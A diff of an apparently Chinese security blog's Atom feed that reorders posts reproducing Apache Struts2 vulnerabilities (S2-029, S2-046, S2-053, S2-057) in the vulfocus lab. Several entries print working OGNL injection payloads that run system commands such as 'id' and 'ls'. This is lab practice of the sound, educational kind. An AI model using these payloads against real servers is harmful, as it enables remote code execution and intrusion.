@@ -98,27 +98,6 @@
   </entry>
   
   <entry>
-    <title>S2-029 CVE-2016-0785复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:26.105Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
     <title>S2-019 CVE-2013-4316复现过程</title>
     <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
     <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
@@ -141,17 +120,16 @@
   </entry>
   
   <entry>
-    <title>S2-046 CVE-2017-5638复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <title>S2-029 CVE-2016-0785复现过程</title>
+    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:42:34.705Z</updated>
+    <updated>2020-09-18T11:41:26.105Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p><a id="more"></a><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p></li><li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p></li></ol>]]></content>
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
     
     
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10&lt;/p&gt;</summary>
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
     
     
     
@@ -185,17 +163,17 @@
   </entry>
   
   <entry>
-    <title>S2-053 CVE-2017-12611复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <title>S2-046 CVE-2017-5638复现过程</title>
+    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:42:28.158Z</updated>
+    <updated>2020-09-18T11:42:34.705Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li><li>利用POC</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li></ol>]]></content>
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p><a id="more"></a><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p></li><li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p></li></ol>]]></content>
     
     
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.1-2.3.33&lt;br&gt;Struts 2.5-2.5.10&lt;/p&gt;</summary>
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10&lt;/p&gt;</summary>
     
     
     
@@ -229,6 +207,50 @@
   </entry>
   
   <entry>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-18T11:42:24.035Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p></li><li><p>poc利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;alwaysSelectFullNamespace为true。&lt;br&gt;action元素没有设置namespace属性，或者使用了通配符。&lt;br&gt;命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.3–2.3.34&lt;br&gt;Struts2.5–2.5.16&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-053 CVE-2017-12611复现过程</title>
+    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-18T11:42:28.158Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li><li>利用POC</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.0.1-2.3.33&lt;br&gt;Struts 2.5-2.5.10&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
     <title>S2-059 CVE-2019-0230复现过程</title>
     <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
     <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
@@ -241,28 +263,6 @@
     <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    &lt;/p&gt;
 &lt;p&gt;Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架，应用十分广泛。&lt;/p&gt;
 &lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.0.0 - 2.5.20&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
-    
-    
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-18T11:42:24.035Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p></li><li><p>poc利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;alwaysSelectFullNamespace为true。&lt;br&gt;action元素没有设置namespace属性，或者使用了通配符。&lt;br&gt;命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.3–2.3.34&lt;br&gt;Struts2.5–2.5.16&lt;/p&gt;</summary>
     
     
     
